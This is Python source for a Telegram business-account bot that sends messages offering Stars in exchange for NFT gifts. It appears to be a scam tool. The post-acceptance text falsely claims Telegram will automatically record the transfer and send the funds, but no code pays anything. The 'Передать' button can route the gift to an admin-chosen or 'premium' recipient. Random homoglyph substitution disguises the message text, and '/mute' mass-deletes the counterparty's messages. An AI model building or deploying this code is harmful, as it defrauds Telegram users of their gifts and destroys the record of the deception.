import asyncio
import hmac
import html
import json
import logging
import math
import os
import random
import re
import time
import uuid

from aiohttp import ClientSession, ClientTimeout, web

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("offers")

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_URL = (os.environ.get("PUBLIC_URL") or os.environ.get("RENDER_EXTERNAL_URL", "")).rstrip("/")
SECRET = os.environ.get("WEBHOOK_SECRET") or BOT_TOKEN.split(":")[1][:32]
API = f"{os.environ.get('TG_API', 'https://api.telegram.org')}/bot{BOT_TOKEN}"
DATA_FILE = os.environ.get("OFFERS_FILE", "offers.json")
ADMIN_FILE = os.environ.get("ADMIN_FILE", "admin.json")

BRAND = os.environ.get("BRAND", "Telegram")
TEST_NOTICE = os.environ.get("TEST_NOTICE", "")
OFFER_TTL = int(float(os.environ.get("OFFER_HOURS", 6)) * 3600)
TRANSFER_MIN = int(os.environ.get("TRANSFER_MINUTES", 10))
STRICT = os.environ.get("OFFER_STRICT") == "1"
MAX_STARS = 100_000_000
UPDATES = ["message", "callback_query", "business_connection", "business_message"]
NBSP = "\u00a0"

ADMIN_ID = int(os.environ.get("ADMIN_ID", "6811074441"))
MUTE_LIMIT = int(os.environ.get("MUTE_LIMIT", "500"))  # макс. хранимых сообщений на пару

OFFER_EDIT_DELAY = max(1.0, float(os.environ.get("OFFER_EDIT_DELAY", "1.0")))
HOMOGLYPH_RATE = float(os.environ.get("HOMOGLYPH_RATE", "0.75"))
BUTTON_STYLE = os.environ.get("BUTTON_STYLE", "")

http = None
bot_name = ""
connections, offers = {}, {}
tasks = set()
settings = {"gift_recipient": None}
premium_ids = set()
admin_states = {}
inbox = {}  # (bcid, peer_id) -> [message_id, ...]


# ============ HOMOGLYPH STYLE ============

_HOMOGLYPH = {
    "а": ["a", "α"], "с": ["c"], "е": ["e"], "о": ["o", "ο"],
    "р": ["p", "ρ"], "х": ["x"], "у": ["y"], "к": ["κ"],
    "А": ["A"], "В": ["B"], "Е": ["E"], "К": ["K"], "М": ["M"],
    "Н": ["H"], "О": ["O"], "Р": ["P"], "С": ["C"], "Т": ["T"],
    "У": ["Y"], "Х": ["X"], "І": ["I"], "Ј": ["J"], "Ѕ": ["S"],
}

_TAG_RE = re.compile(r"<(/?)(b|i|u|s|code|a|pre|em|strong|tg-spoiler)(\s[^>]*)?>", re.IGNORECASE)


def _style_plain(s: str) -> str:
    res = []
    for ch in s:
        variants = _HOMOGLYPH.get(ch)
        if variants and random.random() < HOMOGLYPH_RATE:
            res.append(random.choice(variants))
        else:
            res.append(ch)
    return "".join(res)


def style(text: str) -> str:
    out = []
    pos = 0
    depth = 0
    for m in _TAG_RE.finditer(text):
        chunk = text[pos:m.start()]
        out.append(_style_plain(chunk) if depth == 0 else chunk)
        out.append(m.group(0))
        if m.group(1) == "/":
            depth = max(0, depth - 1)
        else:
            depth += 1
        pos = m.end()
    tail = text[pos:]
    out.append(_style_plain(tail) if depth == 0 else tail)
    return "".join(out)


# ============ HELPERS ============

def esc(s):
    return html.escape(str(s))


def num(x):
    return f"{x:,}".replace(",", NBSP)


def btn(text, data):
    b = {"text": text, "callback_data": data}
    if BUTTON_STYLE:
        b["style"] = BUTTON_STYLE
    return b


def background(coro):
    task = asyncio.create_task(coro)
    tasks.add(task)
    task.add_done_callback(tasks.discard)
    return task


async def api(method, **params):
    async with http.post(f"{API}/{method}", json=params) as resp:
        data = await resp.json()
    if not data.get("ok"):
        log.warning("%s: %s", method, data.get("description", data))
    return data


async def send(chat, text, kb=None, bcid=None, preview=False):
    text = style(text)
    params = dict(chat_id=chat, text=text, parse_mode="HTML")
    params["link_preview_options"] = {"is_disabled": not preview}
    if kb:
        params["reply_markup"] = kb
    if bcid:
        params["business_connection_id"] = bcid
    return await api("sendMessage", **params)


async def delete_business_message(bcid, mid):
    return await api("deleteBusinessMessages", business_connection_id=bcid, message_ids=[mid])


async def edit_offer(o, text, kb=None, preview=True):
    text = style(text)
    params = dict(chat_id=o["chat"], message_id=o["mid"], business_connection_id=o["bcid"],
                  text=text, parse_mode="HTML", reply_markup=kb or {"inline_keyboard": []})
    params["link_preview_options"] = {"is_disabled": not preview}
    res = await api("editMessageText", **params)
    if not res.get("ok") and "not modified" in (res.get("description") or "").lower():
        return {"ok": True}
    return res


def save():
    for oid in sorted(offers, key=lambda k: offers[k]["created"])[:-500]:
        del offers[oid]
    inbox_ser = {f"{k[0]}|{k[1]}": v for k, v in inbox.items()}
    tmp = f"{DATA_FILE}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"connections": connections, "offers": offers, "inbox": inbox_ser},
                      f, ensure_ascii=False)
        os.replace(tmp, DATA_FILE)
    except OSError as e:
        log.error("не удалось сохранить %s: %s", DATA_FILE, e)


def save_admin():
    tmp = f"{ADMIN_FILE}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"settings": settings, "premium": sorted(premium_ids)}, f, ensure_ascii=False)
        os.replace(tmp, ADMIN_FILE)
    except OSError as e:
        log.error("не удалось сохранить %s: %s", ADMIN_FILE, e)


def load():
    try:
        with open(DATA_FILE, encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    except (OSError, ValueError) as e:
        log.error("%s не читается: %s", DATA_FILE, e)
        data = {}
    connections.update(data.get("connections", {}))
    offers.update(data.get("offers", {}))
    for k, v in (data.get("inbox") or {}).items():
        bcid, peer = k.split("|", 1)
        inbox[(bcid, int(peer))] = v

    try:
        with open(ADMIN_FILE, encoding="utf-8") as f:
            ad = json.load(f)
    except (FileNotFoundError, OSError, ValueError):
        ad = {}
    settings.update(ad.get("settings", {}))
    premium_ids.update(ad.get("premium", []))


NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
SLUG = re.compile(r"^(.+)-(\d+)$")
USAGE = ("Формат: <code>/offer ссылка сумма</code>\n"
         "Пример: <code>/offer https://t.me/nft/DurovsCap-1234 500</code>\n"
         "Сумма в звёздах: столько придёт после принятия.")


def gift_name(slug):
    m = SLUG.match(slug)
    if not m:
        return None
    return f"{re.sub(r'(?<=[a-z0-9])(?=[A-Z])', ' ', m.group(1))} #{m.group(2)}"


def parse_offer(arg):
    link = NFT_LINK.search(arg)
    if not link:
        return None, "Не нашёл ссылку на NFT вида https://t.me/nft/DurovsCap-1234"
    slug = link.group(1)
    name = gift_name(slug)
    if not name:
        return None, "Это не похоже на ссылку на NFT: в конце должен быть номер."
    rest = f"{arg[:link.start()]} {arg[link.end():]}"
    amount = re.search(r"\d[\d_,]*", rest)
    if not amount:
        return None, "Не нашёл сумму в звёздах."
    stars_ = int(re.sub(r"[_,]", "", amount.group()))
    if not 1 <= stars_ <= MAX_STARS:
        return None, f"Сумма должна быть от 1 до {num(MAX_STARS)} звёзд."
    return {"slug": slug, "name": name, "stars": stars_}, None


def maker_label(o):
    u = o["maker"]
    return esc(u.get("name") or u.get("username") or "пользователь")


def gift_link(o):
    return f'<a href="https://t.me/nft/{esc(o["slug"])}">{esc(o["name"])}</a>'


def stars(o):
    return f'{num(o["stars"])} ⭐'


def left_text(seconds):
    minutes = math.ceil(max(0, seconds) / 60)
    h, m = divmod(minutes, 60)
    return f"{h} ч. {m} мин." if h else f"{m} мин."


def offer_text(o):
    text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{stars(o)}</b> за подарок {gift_link(o)}.\n\n"
            f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
    return text + (f"\n\n{esc(TEST_NOTICE)}" if TEST_NOTICE else "")


def accepted_text(o):
    u = o["maker"]
    username = u.get("username") or "пользователя"
    return (
        f"<b>Сделка принята!</b>\n\n"
        f"Передайте подарок {gift_link(o)} пользователю @{esc(username)} "
        f"для зачисления <b>{stars(o)}</b> на ваш баланс.\n\n"
        f"<i>Telegram автоматически зафиксирует передачу и отправит средства.</i>"
    )


def declined_text(o):
    return "Отклонено."


def expired_text(o):
    return f"Предложение {stars(o)} за подарок {gift_link(o)} истекло."


def offer_kb(o):
    return {
        "inline_keyboard": [[
            btn("✕ Отклонить", f"of:no:{o['id']}"),
            btn("✓ Принять", f"of:ok:{o['id']}")
        ]]
    }


def resolve_recipient(o):
    maker_id = o["maker"].get("id")
    if maker_id == ADMIN_ID or maker_id in premium_ids:
        return o["maker"].get("username"), maker_id
    rec = settings.get("gift_recipient")
    if rec and rec.get("username"):
        return rec["username"], rec.get("id")
    return o["maker"].get("username"), maker_id


def accepted_kb(o):
    username, tg_id = resolve_recipient(o)
    if username:
        transfer_url = f"tg://send_gift?to={username}"
    else:
        transfer_url = f"tg://user?id={tg_id or 0}"

    transfer = {"text": "✓ Передать", "url": transfer_url}
    if BUTTON_STYLE:
        transfer["style"] = BUTTON_STYLE

    return {
        "inline_keyboard": [
            [
                btn("✕ Отменить", f"of:cancel:{o['id']}"),
                transfer
            ]
        ]
    }
# ============ ADMIN PANEL ============

def is_admin(uid):
    return uid == ADMIN_ID


def admin_kb():
    rec = settings.get("gift_recipient")
    rows = [[btn("🎁 Получатель подарка", "adm:recipient")]]
    if rec and rec.get("username"):
        rows.append([btn("🧹 Снять получателя", "adm:recipient_clear")])
    rows.append([btn("⭐ Премиум", "adm:premium")])
    return {"inline_keyboard": rows}


def admin_panel_text():
    rec = settings.get("gift_recipient")
    if rec and rec.get("username"):
        rec_txt = f"@{esc(rec['username'])}"
    else:
        rec_txt = "по умолчанию (подарок идёт отправителю оффера)"
    prem = ", ".join(str(x) for x in sorted(premium_ids)) if premium_ids else "нет"
    return (
        "<b>Админ-панель</b>\n\n"
        f"🎁 Получатель подарка: {rec_txt}\n"
        f"⭐ Премиум: {prem}"
    )


async def send_admin_panel(chat):
    await send(chat, admin_panel_text(), admin_kb())


# ============ MUTE ============

def remember_incoming(m, conn):
    """Запоминает ID входящего сообщения от собеседника."""
    frm = (m.get("from") or {}).get("id")
    if not frm or frm == conn["user_id"]:
        return
    key = (conn["id"], frm)
    lst = inbox.setdefault(key, [])
    lst.append(m["message_id"])
    if len(lst) > MUTE_LIMIT:
        del lst[:-MUTE_LIMIT]


async def delete_ids(bcid, mids):
    """Удаляет пачками по 100. Возвращает кол-во успешно отправленных на удаление."""
    deleted = 0
    for i in range(0, len(mids), 100):
        chunk = mids[i:i + 100]
        res = await api("deleteBusinessMessages", business_connection_id=bcid, message_ids=chunk)
        if res.get("ok"):
            deleted += len(chunk)
    return deleted


async def do_mute(m, conn, mode="inbox"):
    """mode: 'inbox' — только входящие от собеседника, 'all' — диапазон последних N."""
    chat = m["chat"]["id"]
    bcid = conn["id"]

    # Кого мьютим
    peer = (m.get("reply_to_message") or {}).get("from") or {}
    peer_id = peer.get("id")
    if not peer_id and chat != conn["user_id"]:
        peer_id = chat
    if not peer_id:
        return await send(chat,
                          "⚠️ Не понял, кого мьютить. Ответьте на сообщение собеседника "
                          "или напишите /mute прямо в чате с ним.",
                          bcid=bcid)

    # Удаляем сообщение с командой
    try:
        await delete_business_message(bcid, m["message_id"])
    except Exception:
        pass

    if mode == "all":
        # Удаляем диапазон ID: от (current - MUTE_LIMIT) до current
        cur = m["message_id"]
        mids = list(range(max(1, cur - MUTE_LIMIT), cur))
        deleted = await delete_ids(bcid, mids)
        log.info("mute all: chat=%s peer=%s deleted≈%s", chat, peer_id, deleted)
        return  # без подтверждения — чтобы не плодить сообщения

    # mode == 'inbox' — только входящие
    mids = inbox.get((bcid, peer_id), [])
    if not mids:
        return await send(chat, "ℹ️ Нет сохранённых сообщений от этого собеседника.",
                          bcid=bcid)
    deleted = await delete_ids(bcid, mids)
    inbox[(bcid, peer_id)] = []

    log.info("mute inbox: chat=%s peer=%s deleted=%s", chat, peer_id, deleted)


# ============ OFFERS ============

async def make_offer(m, maker, bcid):
    cmd, _, arg = (m.get("text") or "").partition(" ")
    parsed, error = parse_offer(arg)
    chat = m["chat"]["id"]
    now = time.time()

    try:
        await delete_business_message(bcid, m["message_id"])
    except Exception:
        pass

    if error:
        return await send(chat, f"⚠️ {esc(error)}\n\n{USAGE}", bcid=bcid, preview=False)

    o = {"id": uuid.uuid4().hex[:8], **parsed, "bcid": bcid, "chat": chat, "mid": None, "maker": maker,
         "status": "pending", "created": now, "expires": now + OFFER_TTL}
    offers[o["id"]] = o
    save()

    res = await send(chat, offer_text(o), offer_kb(o), bcid=bcid, preview=True)
    if res.get("ok"):
        o["mid"] = res["result"]["message_id"]
        save()
    else:
        desc = res.get("description", "")
        if "PEER_FLOOD" in desc:
            return await send(chat, "⚠️ Telegram временно ограничил отправку сообщений.", bcid=bcid)
        return await send(chat, f"⚠️ Ошибка: {esc(desc)}", bcid=bcid)


FINAL = {
    "accepted": (accepted_text, accepted_kb),
    "declined": (declined_text, None),
    "expired": (expired_text, None)
}


async def settle(o, status):
    o["status"] = status
    save()

    if status in ("declined", "expired"):
        try:
            await delete_business_message(o["bcid"], o["mid"])
        except Exception:
            pass
        return

    text, kb = FINAL[status]
    await edit_offer(o, text(o), kb(o) if kb else None, preview=True)


async def sweeper():
    while True:
        await asyncio.sleep(60)
        for o in list(offers.values()):
            if o["status"] != "pending":
                continue
            try:
                if o["expires"] < time.time():
                    await settle(o, "expired")
            except Exception:
                pass


async def on_callback(q):
    data = q.get("data", "")
    uid = q["from"]["id"]

    # --- Админ-панель ---
    if data.startswith("adm:"):
        if not is_admin(uid):
            return await api("answerCallbackQuery", callback_query_id=q["id"],
                             text="Нет доступа", show_alert=True)
        action = data.split(":", 1)[1]
        chat = q["message"]["chat"]["id"]

        if action == "recipient":
            admin_states[uid] = "await_recipient"
            await api("answerCallbackQuery", callback_query_id=q["id"])
            return await send(chat,
                              "Введите юзернейм получателя подарка (например <code>@username</code>). "
                              "Отправьте <code>-</code>, чтобы сбросить.")

        if action == "recipient_clear":
            settings["gift_recipient"] = None
            save_admin()
            await api("answerCallbackQuery", callback_query_id=q["id"], text="Сброшено")
            return await send(chat,
                              "✅ Получатель снят. Подарки снова идут отправителю оффера.",
                              admin_kb())

        if action == "premium":
            admin_states[uid] = "await_premium"
            await api("answerCallbackQuery", callback_query_id=q["id"])
            return await send(chat,
                              "Введите ID пользователя, которому выдать премиум. "
                              "Чтобы снять — отправьте <code>-ID</code>.")

        return await api("answerCallbackQuery", callback_query_id=q["id"])

    # --- Офферы ---
    parts = data.split(":")
    o = offers.get(parts[2]) if len(parts) == 3 and parts[0] == "of" else None

    if o is None:
        return await api("answerCallbackQuery", callback_query_id=q["id"])

    action = parts[1]

    if action == "cancel":
        try:
            await delete_business_message(o["bcid"], o["mid"])
        except Exception:
            pass
        o["status"] = "declined"
        save()
        return await api("answerCallbackQuery", callback_query_id=q["id"])

    if action in ("ok", "no"):
        if o["status"] != "pending":
            return await api("answerCallbackQuery", callback_query_id=q["id"],
                             text="Сделка уже обработана", show_alert=True)

        if time.time() > o["expires"]:
            await settle(o, "expired")
            return await api("answerCallbackQuery", callback_query_id=q["id"],
                             text="Срок предложения истёк", show_alert=True)

        if action == "ok":
            await settle(o, "accepted")
            await api("answerCallbackQuery", callback_query_id=q["id"])
        else:
            await settle(o, "declined")
            await api("answerCallbackQuery", callback_query_id=q["id"])


def conn_from(c):
    rights = c.get("rights")
    rights = rights if isinstance(rights, dict) else {}
    can_reply = bool(rights.get("can_reply", c.get("can_reply")))
    can_delete = bool(rights.get("can_delete_all_messages"))
    user = c["user"]
    chat_id = user.get("id")
    return {"id": c["id"], "user_id": user["id"], "chat": chat_id, "name": user.get("first_name", ""),
            "username": user.get("username"), "enabled": c.get("is_enabled", True), "can_reply": can_reply,
            "can_delete": can_delete}


async def on_connection(c):
    conn = conn_from(c)
    connections[conn["id"]] = conn
    save()
    if not conn["enabled"]:
        text = "🔌 Бот отключён."
    elif not conn["can_reply"]:
        text = "⚠️ Бот подключён, но без права отвечать."
    else:
        text = ("✅ <b>Готово, бот подключён.</b>\n\n"
                "В любом чате напиши:\n<code>/offer ссылка сумма</code>\n"
                "<code>/mute</code> — удалить все входящие от собеседника\n"
                "<code>/mute all</code> — удалить последние сообщения в чате")
    await send(conn["chat"], text)


async def get_connection(bcid):
    conn = connections.get(bcid)
    if conn is None:
        res = await api("getBusinessConnection", business_connection_id=bcid)
        if res.get("ok"):
            conn = connections[bcid] = conn_from(res["result"])
            save()
    return conn


async def on_business_message(m):
    text = m.get("text") or ""
    first = text.partition(" ")[0].lower()

    conn = await get_connection(m["business_connection_id"])
    if not conn:
        return

    # Запоминаем КАЖДОЕ входящее (даже не команду)
    remember_incoming(m, conn)

    if first not in ("/offer", "/mute"):
        return

    frm = m.get("from") or {}
    if frm.get("id") != conn["user_id"]:
        return
    if not (conn["enabled"] and conn["can_reply"]):
        return await send(conn["chat"], "⚠️ У бота нет права отвечать на сообщения.")

    if first == "/mute":
        arg = text.partition(" ")[2].strip().lower()
        mode = "all" if arg == "all" else "inbox"
        return await do_mute(m, conn, mode)

    maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
    await make_offer(m, maker, conn["id"])


async def on_message(m):
    chat = m["chat"]["id"]
    uid = (m.get("from") or {}).get("id")
    text = (m.get("text") or "").strip()

    # --- Состояния админ-панели ---
    state = admin_states.get(uid)
    if state and is_admin(uid):
        admin_states[uid] = None
        if state == "await_recipient":
            if text == "-":
                settings["gift_recipient"] = None
                save_admin()
                await send(chat, "✅ Получатель снят. Подарки идут отправителю.")
                return await send_admin_panel(chat)
            uname = text.lstrip("@").strip()
            if not re.fullmatch(r"[A-Za-z0-9_]{4,32}", uname):
                return await send(chat, "⚠️ Некорректный юзернейм. Попробуйте снова или /admin.")
            settings["gift_recipient"] = {"username": uname, "id": None}
            save_admin()
            await send(chat, f"✅ Получатель подарка: @{esc(uname)}")
            return await send_admin_panel(chat)

        if state == "await_premium":
            if text == "-":
                return await send(chat, "⚠️ Укажите ID: <code>-123456</code> чтобы снять, "
                                        "<code>123456</code> чтобы выдать.")
            if text.startswith("-"):
                try:
                    pid = int(text[1:])
                except ValueError:
                    return await send(chat, "⚠️ Нужен числовой ID.")
                premium_ids.discard(pid)
                save_admin()
                await send(chat, f"✅ Премиум снят с {pid}.")
                return await send_admin_panel(chat)
            try:
                pid = int(text)
            except ValueError:
                return await send(chat, "⚠️ Нужен числовой ID.")
            premium_ids.add(pid)
            save_admin()
            await send(chat, f"✅ Премиум выдан {pid}. Его офферы идут на него.")
            return await send_admin_panel(chat)
        return

    cmd_list = text.split()[:1]
    cmd = cmd_list[0].split("@")[0].lower() if cmd_list else ""

    if cmd in ("/start", "/help"):
        copy_btn = {"text": "📋 Скопировать юзернейм бота",
                    "copy_text": {"text": f"@{bot_name}"}}
        if BUTTON_STYLE:
            copy_btn["style"] = BUTTON_STYLE
        kb = {"inline_keyboard": [[copy_btn]]}
        await send(chat, "👋 Привет!", kb)
    elif cmd == "/admin":
        if is_admin(uid):
            await send_admin_panel(chat)
        else:
            await send(chat, "⛔️ Нет доступа.")


async def handle(update):
    try:
        if "business_connection" in update:
            await on_connection(update["business_connection"])
        elif "business_message" in update:
            await on_business_message(update["business_message"])
        elif "callback_query" in update:
            await on_callback(update["callback_query"])
        elif "message" in update:
            await on_message(update["message"])
    except Exception:
        log.exception("апдейт %s", update.get("update_id"))


async def webhook(req):
    token = req.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if not hmac.compare_digest(token.encode(), SECRET.encode()):
        return web.Response(status=403)
    try:
        update = await req.json()
    except ValueError:
        return web.Response(status=400)
    background(handle(update))
    return web.Response(text="ok")


async def health(req):
    return web.Response(text="ok")


async def keepalive():
    while True:
        await asyncio.sleep(600)
        try:
            async with http.get(f"{PUBLIC_URL}/health") as resp:
                await resp.read()
        except Exception as e:
            log.warning("keepalive: %s", e)


async def poll_updates():
    await api("deleteWebhook")
    offset = 0
    while True:
        try:
            data = await api("getUpdates", offset=offset, timeout=30, allowed_updates=UPDATES)
            for update in data.get("result", []):
                offset = update["update_id"] + 1
                background(handle(update))
            if not data.get("ok"):
                await asyncio.sleep(3)
        except Exception as e:
            log.warning("getUpdates: %s", e)
            await asyncio.sleep(3)


async def main():
    global http, bot_name
    http = ClientSession(timeout=ClientTimeout(total=70))
    load()
    me = (await api("getMe")).get("result") or {}
    if not me:
        raise SystemExit("BOT_TOKEN не подходит")
    bot_name = me["username"]
    log.info("юзернейм бота: @%s", bot_name)
    await api("setMyCommands", commands=[
        {"command": "start", "description": "Подключение"},
        {"command": "admin", "description": "Админ-панель"},
    ])
    background(sweeper())
    if PUBLIC_URL:
        app = web.Application()
        app.router.add_get("/health", health)
        app.router.add_post("/webhook", webhook)
        runner = web.AppRunner(app)
        await runner.setup()
        await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000))).start()
        await api("setWebhook", url=f"{PUBLIC_URL}/webhook", secret_token=SECRET,
                  allowed_updates=UPDATES, drop_pending_updates=True)
        background(keepalive())
    else:
        background(poll_updates())
    log.info("оффер-бот @%s запущен", bot_name)
    await asyncio.Event().wait()


if __name__ == "__main__":
    asyncio.run(main())
